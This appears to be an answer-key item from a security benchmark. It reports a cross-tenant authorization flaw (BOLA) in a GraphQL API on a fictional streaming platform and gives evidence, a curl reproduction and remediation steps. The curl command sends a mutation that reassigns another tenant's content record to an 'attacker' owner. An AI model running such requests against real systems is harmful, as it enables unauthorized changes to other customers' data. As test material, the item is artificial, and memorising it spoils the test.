# Expected Response

## System
- Domain: Media / Streaming
- System: StreamCore VOD Platform
- Example ID: GQL-0119

## Priority Findings

### Finding 1: VOD Content Cross-Service Identity Drift — Cross-Tenant Streaming Record Mutation (Pattern 1.10)
**Severity:** Critical
**Category:** BOLA / Cross-Service Identity Drift

**Summary:**
Per §5.0 (Pattern 1.10 — cross-service identity propagation drift): The downstream GraphQL resolver trusts a forwarded or client-supplied identity rather than re-validating the JWT-bound tenantId. An attacker from `tenant-b0e4` submitted `updateResource(id: "R-2119", input: {status: "approved", ownerId: "attacker-b0e41c3a"})` against a VOD content record belonging to `tenant-1c3a`. In a streaming media platform with multiple microservices (CDN, metadata, billing), cross-service identity drift enables unauthorized content access and ownership manipulation.

**Evidence from HAR:**
- Request: `POST https://api.streamcore-vod-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-b0e4`
- Mutation: `updateResource(id: "R-2119", input: {status: "approved", ownerId: "attacker-b0e41c3a"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-1c3a"`, `sensitiveField: "CONFIDENTIAL-b0e41c3a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-b0e41c3a`

## Steps to Reproduce

### Step 1 — Cross-service streaming content mutation (HAR)
```bash
curl -s -X POST https://api.streamcore-vod-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-b0e4" \
  -d '{"query": "mutation { updateResource(id: \"R-2119\", input: {status: \"approved\", ownerId: \"attacker-b0e41c3a\"}) { resourceId status } }"}'
```
**Vulnerable:** VOD content from `tenant-1c3a` mutated. **Secure:** FORBIDDEN.

## Remediation
1. Each service must re-validate JWT and extract tenantId independently.
2. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `ResourceInput`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
